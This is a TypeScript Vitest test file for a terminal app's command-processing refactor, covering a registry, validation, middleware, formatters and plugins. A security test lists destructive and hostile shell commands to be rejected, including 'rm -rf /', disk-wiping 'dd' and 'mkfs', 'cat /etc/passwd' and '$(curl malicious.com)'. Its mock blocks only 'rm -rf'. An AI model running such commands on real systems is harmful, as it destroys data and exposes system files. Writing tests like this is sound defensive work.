/**
 * COMMAND SYSTEM PROTECTION TESTS
 * 
 * Tests to protect the command processing system during refactoring
 * from scattered command handlers to a unified commands feature module.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';

// =============================================================================
// COMMAND SYSTEM PROTECTION TESTS
// =============================================================================

describe('🛡️ Command System Protection', () => {
  describe('🔴 RED Phase: Current Command Architecture', () => {
    it('should validate current command handler structure', () => {
      // RED: Test current command handlers
      const currentCommandHandlers = [
        'BaseCommandHandler',
        'FileSystemCommands',
        'SystemCommands',
        'UtilityCommands',
        'CargoCommands',
        'GeminiCommands',
        'ClaudeCommands',
        'ClaudeCodeCommands',
        'EnvironmentCommands',
        'RustCommands'
      ];
      
      currentCommandHandlers.forEach(handler => {
        const handlerExists = mockCommandHandlerExists(handler);
        expect(handlerExists).toBe(true);
      });
    });

    it('should process basic file system commands', () => {
      // RED: File system command processing
      const fileSystemCommands = [
        { cmd: 'pwd', expectedOutput: /\/.*/, exitCode: 0 },
        { cmd: 'ls', expectedOutput: /.*/, exitCode: 0 },
        { cmd: 'cd .', expectedOutput: '', exitCode: 0 },
        { cmd: 'mkdir test', expectedOutput: '', exitCode: 0 },
        { cmd: 'touch test.txt', expectedOutput: '', exitCode: 0 },
        { cmd: 'cat README.md', expectedOutput: /.*/, exitCode: 0 }
      ];
      
      fileSystemCommands.forEach(({ cmd, expectedOutput, exitCode }) => {
        const result = processCommand(cmd);
        expect(result.exitCode).toBe(exitCode);
        expect(result.output).toMatch(expectedOutput);
        expect(result.timestamp).toBeDefined();
        expect(result.id).toBeDefined();
      });
    });

    it('should handle system commands', () => {
      // RED: System command processing
      const systemCommands = [
        { cmd: 'echo hello', expectedOutput: 'hello', exitCode: 0 },
        { cmd: 'whoami', expectedOutput: /\w+/, exitCode: 0 },
        { cmd: 'date', expectedOutput: /.*/, exitCode: 0 },
        { cmd: 'env', expectedOutput: /.*/, exitCode: 0 },
        { cmd: 'uptime', expectedOutput: /.*/, exitCode: 0 },
        { cmd: 'hostname', expectedOutput: /.*/, exitCode: 0 }
      ];
      
      systemCommands.forEach(({ cmd, expectedOutput, exitCode }) => {
        const result = processCommand(cmd);
        expect(result.exitCode).toBe(exitCode);
        expect(result.output).toMatch(expectedOutput);
      });
    });

    it('should validate command security', () => {
      // RED: Security validation
      const dangerousCommands = [
        'rm -rf /',
        'sudo rm -rf /',
        '$(curl malicious.com)',
        'cat /etc/passwd',
        'chmod 777 /',
        'dd if=/dev/zero of=/dev/sda',
        'mkfs.ext4 /dev/sda1'
      ];
      
      dangerousCommands.forEach(cmd => {
        const result = processCommand(cmd);
        expect(result.exitCode).not.toBe(0);
        expect(result.output).toMatch(/error|forbidden|invalid/i);
      });
    });

    it('should handle AI provider commands', () => {
      // RED: AI command processing
      const aiCommands = [
        { cmd: 'ai chat "hello"', provider: 'claude' },
        { cmd: 'ai switch gemini', provider: 'gemini' },
        { cmd: 'ai providers', provider: null },
        { cmd: 'ai status', provider: null },
        { cmd: 'claude auth', provider: 'claude' },
        { cmd: 'gemini list', provider: 'gemini' }
      ];
      
      aiCommands.forEach(({ cmd, provider }) => {
        const result = processCommand(cmd);
        if (provider) {
          expect(result.output).toContain(provider);
        }
        expect(result.id).toBeDefined();
      });
    });
  });

  describe('🟢 GREEN Phase: Command System Refactoring', () => {
    it('should implement unified command registry', () => {
      // GREEN: Command registry implementation
      interface CommandHandler {
        name: string;
        description: string;
        usage: string;
        execute(args: string[], context: CommandContext): Promise<CommandResult>;
      }
      
      interface CommandContext {
        sessionId: string;
        currentPath: string;
        environment: Record<string, string>;
      }
      
      interface CommandResult {
        id: string;
        command: string;
        output: string;
        exitCode: number;
        timestamp: string;
      }
      
      class CommandRegistry {
        private handlers = new Map<string, CommandHandler>();
        
        register(command: string, handler: CommandHandler): void {
          this.handlers.set(command, handler);
        }
        
        unregister(command: string): boolean {
          return this.handlers.delete(command);
        }
        
        getHandler(command: string): CommandHandler | undefined {
          return this.handlers.get(command);
        }
        
        getAvailableCommands(): string[] {
          return Array.from(this.handlers.keys());
        }
        
        async execute(command: string, args: string[], context: CommandContext): Promise<CommandResult> {
          const handler = this.handlers.get(command);
          if (!handler) {
            return {
              id: generateId(),
              command: `${command} ${args.join(' ')}`,
              output: `Command '${command}' not found`,
              exitCode: 127,
              timestamp: new Date().toISOString()
            };
          }
          
          return await handler.execute(args, context);
        }
      }
      
      const registry = new CommandRegistry();
      
      // Test registry functionality
      const mockHandler: CommandHandler = {
        name: 'test',
        description: 'Test command',
        usage: 'test [args]',
        execute: async () => ({
          id: generateId(),
          command: 'test',
          output: 'Test output',
          exitCode: 0,
          timestamp: new Date().toISOString()
        })
      };
      
      registry.register('test', mockHandler);
      
      expect(registry.getHandler('test')).toBe(mockHandler);
      expect(registry.getAvailableCommands()).toContain('test');
      
      const unregistered = registry.unregister('test');
      expect(unregistered).toBe(true);
      expect(registry.getHandler('test')).toBeUndefined();
    });

    it('should implement command validation pipeline', () => {
      // GREEN: Command validation system
      interface ValidationRule {
        name: string;
        validate(command: string, args: string[]): ValidationResult;
      }
      
      interface ValidationResult {
        isValid: boolean;
        errors: string[];
        warnings: string[];
      }
      
      class CommandValidator {
        private rules: ValidationRule[] = [];
        
        addRule(rule: ValidationRule): void {
          this.rules.push(rule);
        }
        
        removeRule(ruleName: string): void {
          this.rules = this.rules.filter(rule => rule.name !== ruleName);
        }
        
        validate(command: string, args: string[]): ValidationResult {
          const result: ValidationResult = {
            isValid: true,
            errors: [],
            warnings: []
          };
          
          for (const rule of this.rules) {
            const ruleResult = rule.validate(command, args);
            
            result.errors.push(...ruleResult.errors);
            result.warnings.push(...ruleResult.warnings);
            
            if (!ruleResult.isValid) {
              result.isValid = false;
            }
          }
          
          return result;
        }
      }
      
      // Security validation rule
      const securityRule: ValidationRule = {
        name: 'security',
        validate: (command, args) => {
          const dangerousCommands = ['rm', 'dd', 'mkfs', 'format'];
          const dangerousFlags = ['-rf', '--force', '--no-preserve-root'];
          
          const errors: string[] = [];
          
          if (dangerousCommands.includes(command)) {
            const hasDangerousFlags = args.some(arg => 
              dangerousFlags.some(flag => arg.includes(flag))
            );
            
            if (hasDangerousFlags) {
              errors.push('Dangerous command with destructive flags not allowed');
            }
          }
          
          return {
            isValid: errors.length === 0,
            errors,
            warnings: []
          };
        }
      };
      
      // Length validation rule
      const lengthRule: ValidationRule = {
        name: 'length',
        validate: (command, args) => {
          const fullCommand = `${command} ${args.join(' ')}`;
          const warnings: string[] = [];
          
          if (fullCommand.length > 1000) {
            warnings.push('Command is very long and may be truncated');
          }
          
          return {
            isValid: fullCommand.length <= 2000,
            errors: fullCommand.length > 2000 ? ['Command too long'] : [],
            warnings
          };
        }
      };
      
      const validator = new CommandValidator();
      validator.addRule(securityRule);
      validator.addRule(lengthRule);
      
      // Test validation
      const safeResult = validator.validate('ls', ['-la']);
      expect(safeResult.isValid).toBe(true);
      expect(safeResult.errors).toHaveLength(0);
      
      const dangerousResult = validator.validate('rm', ['-rf', '/']);
      expect(dangerousResult.isValid).toBe(false);
      expect(dangerousResult.errors.length).toBeGreaterThan(0);
    });

    it('should implement command middleware chain', () => {
      // GREEN: Command middleware system
      type CommandMiddleware = (
        command: string,
        args: string[],
        context: CommandContext,
        next: () => Promise<CommandResult>
      ) => Promise<CommandResult>;
      
      class CommandProcessor {
        private middlewares: CommandMiddleware[] = [];
        
        use(middleware: CommandMiddleware): void {
          this.middlewares.push(middleware);
        }
        
        async process(
          command: string,
          args: string[],
          context: CommandContext,
          finalHandler: () => Promise<CommandResult>
        ): Promise<CommandResult> {
          let index = 0;
          
          const next = async (): Promise<CommandResult> => {
            if (index < this.middlewares.length) {
              const middleware = this.middlewares[index++];
              return await middleware(command, args, context, next);
            } else {
              return await finalHandler();
            }
          };
          
          return await next();
        }
      }
      
      // Logging middleware
      const loggingMiddleware: CommandMiddleware = async (command, args, context, next) => {
        console.log(`Executing: ${command} ${args.join(' ')}`);
        const start = Date.now();
        
        const result = await next();
        
        const duration = Date.now() - start;
        console.log(`Completed in ${duration}ms with exit code ${result.exitCode}`);
        
        return result;
      };
      
      // Rate limiting middleware
      const rateLimitMiddleware: CommandMiddleware = async (command, args, context, next) => {
        const rateLimitKey = context.sessionId;
        
        if (mockRateLimitExceeded(rateLimitKey)) {
          return {
            id: generateId(),
            command: `${command} ${args.join(' ')}`,
            output: 'Rate limit exceeded. Please wait before executing more commands.',
            exitCode: 429,
            timestamp: new Date().toISOString()
          };
        }
        
        return await next();
      };
      
      // History middleware
      const historyMiddleware: CommandMiddleware = async (command, args, context, next) => {
        const result = await next();
        
        // Add to command history
        mockAddToHistory(context.sessionId, `${command} ${args.join(' ')}`);
        
        return result;
      };
      
      const processor = new CommandProcessor();
      processor.use(loggingMiddleware);
      processor.use(rateLimitMiddleware);
      processor.use(historyMiddleware);
      
      expect(processor).toBeDefined();
    });

    it('should implement command result formatting', () => {
      // GREEN: Result formatting system
      interface OutputFormatter {
        format(result: CommandResult, options?: FormatOptions): string;
      }
      
      interface FormatOptions {
        includeTimestamp?: boolean;
        includeExitCode?: boolean;
        colorize?: boolean;
        maxLength?: number;
      }
      
      class PlainTextFormatter implements OutputFormatter {
        format(result: CommandResult, options: FormatOptions = {}): string {
          let output = result.output;
          
          if (options.maxLength && output.length > options.maxLength) {
            output = output.substring(0, options.maxLength) + '...';
          }
          
          if (options.includeTimestamp) {
            output += `\n[${result.timestamp}]`;
          }
          
          if (options.includeExitCode) {
            output += `\n[Exit code: ${result.exitCode}]`;
          }
          
          return output;
        }
      }
      
      class JSONFormatter implements OutputFormatter {
        format(result: CommandResult, options: FormatOptions = {}): string {
          const formatted = {
            output: result.output,
            exitCode: result.exitCode,
            ...(options.includeTimestamp && { timestamp: result.timestamp }),
            ...(options.includeExitCode && { exitCode: result.exitCode })
          };
          
          return JSON.stringify(formatted, null, 2);
        }
      }
      
      class ANSIFormatter implements OutputFormatter {
        format(result: CommandResult, options: FormatOptions = {}): string {
          let output = result.output;
          
          if (options.colorize) {
            if (result.exitCode === 0) {
              output = `\x1b[32m${output}\x1b[0m`; // Green for success
            } else {
              output = `\x1b[31m${output}\x1b[0m`; // Red for error
            }
          }
          
          return output;
        }
      }
      
      const mockResult: CommandResult = {
        id: 'test-123',
        command: 'ls -la',
        output: 'file1.txt\nfile2.txt',
        exitCode: 0,
        timestamp: '2024-01-01T00:00:00.000Z'
      };
      
      const plainFormatter = new PlainTextFormatter();
      const jsonFormatter = new JSONFormatter();
      const ansiFormatter = new ANSIFormatter();
      
      const plainOutput = plainFormatter.format(mockResult, { includeTimestamp: true });
      expect(plainOutput).toContain('file1.txt');
      expect(plainOutput).toContain('[2024-01-01T00:00:00.000Z]');
      
      const jsonOutput = jsonFormatter.format(mockResult, { includeExitCode: true });
      expect(jsonOutput).toContain('"exitCode": 0');
      
      const ansiOutput = ansiFormatter.format(mockResult, { colorize: true });
      expect(ansiOutput).toContain('\x1b[32m'); // Green color code
    });
  });

  describe('🔵 REFACTOR Phase: Commands Feature Module', () => {
    it('should organize command handlers in feature module', () => {
      // REFACTOR: Command feature organization
      const commandModuleStructure = {
        'features/commands/handlers/': [
          'BaseCommandHandler',
          'FileSystemCommands',
          'SystemCommands',
          'UtilityCommands',
          'RustCommands',
          'AICommands'
        ],
        'features/commands/processors/': [
          'CommandProcessor',
          'SecureProcessor',
          'AsyncProcessor'
        ],
        'features/commands/registry/': [
          'CommandRegistry',
          'HandlerRegistry',
          'MiddlewareRegistry'
        ],
        'features/commands/validators/': [
          'SecurityValidator',
          'InputValidator',
          'PermissionValidator'
        ],
        'features/commands/formatters/': [
          'PlainTextFormatter',
          'JSONFormatter',
          'ANSIFormatter'
        ]
      };
      
      Object.entries(commandModuleStructure).forEach(([module, handlers]) => {
        expect(mockModuleExists(module)).toBe(true);
        
        handlers.forEach(handler => {
          expect(mockHandlerExists(`${module}${handler}`)).toBe(true);
        });
      });
    });

    it('should maintain command API compatibility', () => {
      // REFACTOR: API compatibility
      const commandAPI = {
        // Core command processing
        processCommand: expect.any(Function),
        validateCommand: expect.any(Function),
        formatResult: expect.any(Function),
        
        // Registry management
        registerHandler: expect.any(Function),
        unregisterHandler: expect.any(Function),
        getAvailableCommands: expect.any(Function),
        
        // Middleware support
        addMiddleware: expect.any(Function),
        removeMiddleware: expect.any(Function),
        
        // Security features
        validateSecurity: expect.any(Function),
        checkPermissions: expect.any(Function),
        
        // AI integration
        routeAICommand: expect.any(Function),
        switchAIProvider: expect.any(Function)
      };
      
      const exportedAPI = mockCommandFeatureAPI();
      
      Object.keys(commandAPI).forEach(apiMethod => {
        expect(exportedAPI).toHaveProperty(apiMethod);
        expect(typeof exportedAPI[apiMethod]).toBe('function');
      });
    });

    it('should support plugin-style command extensions', () => {
      // REFACTOR: Plugin architecture
      interface CommandPlugin {
        name: string;
        version: string;
        commands: string[];
        install(registry: CommandRegistry): void;
        uninstall(registry: CommandRegistry): void;
      }
      
      class PluginManager {
        private plugins = new Map<string, CommandPlugin>();
        
        constructor(private registry: CommandRegistry) {}
        
        registerPlugin(plugin: CommandPlugin): void {
          if (this.plugins.has(plugin.name)) {
            throw new Error(`Plugin '${plugin.name}' already registered`);
          }
          
          plugin.install(this.registry);
          this.plugins.set(plugin.name, plugin);
        }
        
        unregisterPlugin(name: string): boolean {
          const plugin = this.plugins.get(name);
          if (plugin) {
            plugin.uninstall(this.registry);
            this.plugins.delete(name);
            return true;
          }
          return false;
        }
        
        getInstalledPlugins(): CommandPlugin[] {
          return Array.from(this.plugins.values());
        }
      }
      
      // Example plugin
      const dockerPlugin: CommandPlugin = {
        name: 'docker',
        version: '1.0.0',
        commands: ['docker', 'docker-compose'],
        
        install(registry: CommandRegistry) {
          const dockerHandler: CommandHandler = {
            name: 'docker',
            description: 'Docker container management',
            usage: 'docker [subcommand] [options]',
            execute: async (args, context) => ({
              id: generateId(),
              command: `docker ${args.join(' ')}`,
              output: 'Docker command executed',
              exitCode: 0,
              timestamp: new Date().toISOString()
            })
          };
          
          registry.register('docker', dockerHandler);
        },
        
        uninstall(registry: CommandRegistry) {
          registry.unregister('docker');
        }
      };
      
      const registry = new CommandRegistry();
      const pluginManager = new PluginManager(registry);
      
      pluginManager.registerPlugin(dockerPlugin);
      
      expect(pluginManager.getInstalledPlugins()).toHaveLength(1);
      expect(registry.getAvailableCommands()).toContain('docker');
      
      const unregistered = pluginManager.unregisterPlugin('docker');
      expect(unregistered).toBe(true);
      expect(registry.getAvailableCommands()).not.toContain('docker');
    });

    it('should implement command completion system', () => {
      // REFACTOR: Command completion
      interface CompletionProvider {
        getCompletions(input: string, cursorPosition: number): Completion[];
      }
      
      interface Completion {
        text: string;
        description?: string;
        type: 'command' | 'argument' | 'flag' | 'file' | 'directory';
      }
      
      class CommandCompletionProvider implements CompletionProvider {
        constructor(private registry: CommandRegistry) {}
        
        getCompletions(input: string, cursorPosition: number): Completion[] {
          const parts = input.slice(0, cursorPosition).split(' ');
          const currentPart = parts[parts.length - 1];
          
          if (parts.length === 1) {
            // Complete command names
            return this.registry.getAvailableCommands()
              .filter(cmd => cmd.startsWith(currentPart))
              .map(cmd => ({
                text: cmd,
                type: 'command' as const,
                description: this.getCommandDescription(cmd)
              }));
          } else {
            // Complete arguments/flags
            const command = parts[0];
            return this.getArgumentCompletions(command, currentPart);
          }
        }
        
        private getCommandDescription(command: string): string {
          const handler = this.registry.getHandler(command);
          return handler?.description || '';
        }
        
        private getArgumentCompletions(command: string, partial: string): Completion[] {
          // Mock argument completions
          const commonFlags = ['-h', '--help', '-v', '--verbose', '-q', '--quiet'];
          
          return commonFlags
            .filter(flag => flag.startsWith(partial))
            .map(flag => ({
              text: flag,
              type: 'flag' as const,
              description: this.getFlagDescription(flag)
            }));
        }
        
        private getFlagDescription(flag: string): string {
          const descriptions: Record<string, string> = {
            '-h': 'Show help',
            '--help': 'Show help',
            '-v': 'Verbose output',
            '--verbose': 'Verbose output',
            '-q': 'Quiet mode',
            '--quiet': 'Quiet mode'
          };
          
          return descriptions[flag] || '';
        }
      }
      
      const registry = new CommandRegistry();
      const completionProvider = new CommandCompletionProvider(registry);
      
      // Mock some commands
      registry.register('ls', mockCommandHandler('ls'));
      registry.register('cat', mockCommandHandler('cat'));
      registry.register('grep', mockCommandHandler('grep'));
      
      const completions = completionProvider.getCompletions('l', 1);
      expect(completions).toHaveLength(1);
      expect(completions[0].text).toBe('ls');
      expect(completions[0].type).toBe('command');
    });
  });
});

// =============================================================================
// HELPER FUNCTIONS FOR COMMAND TESTS
// =============================================================================

function mockCommandHandlerExists(handler: string): boolean {
  const handlers = [
    'BaseCommandHandler',
    'FileSystemCommands',
    'SystemCommands',
    'UtilityCommands',
    'CargoCommands',
    'GeminiCommands',
    'ClaudeCommands',
    'ClaudeCodeCommands',
    'EnvironmentCommands',
    'RustCommands'
  ];
  
  return handlers.includes(handler);
}

function processCommand(command: string) {
  // Mock command processing
  const [baseCommand, ...args] = command.split(' ');
  
  // Security check
  if (baseCommand === 'rm' && args.includes('-rf')) {
    return {
      id: generateId(),
      command,
      output: 'Error: Dangerous command not allowed',
      exitCode: 1,
      timestamp: new Date().toISOString()
    };
  }
  
  // Basic command simulation
  const outputs: Record<string, string> = {
    'pwd': '/home/user/project',
    'ls': 'file1.txt\nfile2.txt\nfolder1/',
    'echo': args.join(' '),
    'whoami': 'user',
    'date': new Date().toString(),
    'env': 'HOME=/home/user\nPATH=/usr/bin',
    'uptime': 'up 2 days, 4 hours',
    'hostname': 'terminal-forge'
  };
  
  return {
    id: generateId(),
    command,
    output: outputs[baseCommand] || 'Mock output',
    exitCode: 0,
    timestamp: new Date().toISOString()
  };
}

function generateId(): string {
  return `cmd-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
}

function mockRateLimitExceeded(key: string): boolean {
  // Mock rate limiting - always allow for testing
  return false;
}

function mockAddToHistory(sessionId: string, command: string): void {
  // Mock history addition
  console.log(`Added to history [${sessionId}]: ${command}`);
}

function mockModuleExists(module: string): boolean {
  return true; // Mock implementation
}

function mockHandlerExists(handler: string): boolean {
  return true; // Mock implementation
}

function mockCommandFeatureAPI() {
  return {
    processCommand: () => {},
    validateCommand: () => {},
    formatResult: () => {},
    registerHandler: () => {},
    unregisterHandler: () => {},
    getAvailableCommands: () => [],
    addMiddleware: () => {},
    removeMiddleware: () => {},
    validateSecurity: () => {},
    checkPermissions: () => {},
    routeAICommand: () => {},
    switchAIProvider: () => {}
  };
}

function mockCommandHandler(name: string) {
  return {
    name,
    description: `${name} command handler`,
    usage: `${name} [options]`,
    execute: async () => ({
      id: generateId(),
      command: name,
      output: `${name} output`,
      exitCode: 0,
      timestamp: new Date().toISOString()
    })
  };
}

// Re-export types for other test files
export interface CommandHandler {
  name: string;
  description: string;
  usage: string;
  execute(args: string[], context: CommandContext): Promise<CommandResult>;
}

export interface CommandContext {
  sessionId: string;
  currentPath: string;
  environment: Record<string, string>;
}

export interface CommandResult {
  id: string;
  command: string;
  output: string;
  exitCode: number;
  timestamp: string;
}

export class CommandRegistry {
  private handlers = new Map<string, CommandHandler>();
  
  register(command: string, handler: CommandHandler): void {
    this.handlers.set(command, handler);
  }
  
  unregister(command: string): boolean {
    return this.handlers.delete(command);
  }
  
  getHandler(command: string): CommandHandler | undefined {
    return this.handlers.get(command);
  }
  
  getAvailableCommands(): string[] {
    return Array.from(this.handlers.keys());
  }
  
  async execute(command: string, args: string[], context: CommandContext): Promise<CommandResult> {
    const handler = this.handlers.get(command);
    if (!handler) {
      return {
        id: generateId(),
        command: `${command} ${args.join(' ')}`,
        output: `Command '${command}' not found`,
        exitCode: 127,
        timestamp: new Date().toISOString()
      };
    }
    
    return await handler.execute(args, context);
  }
}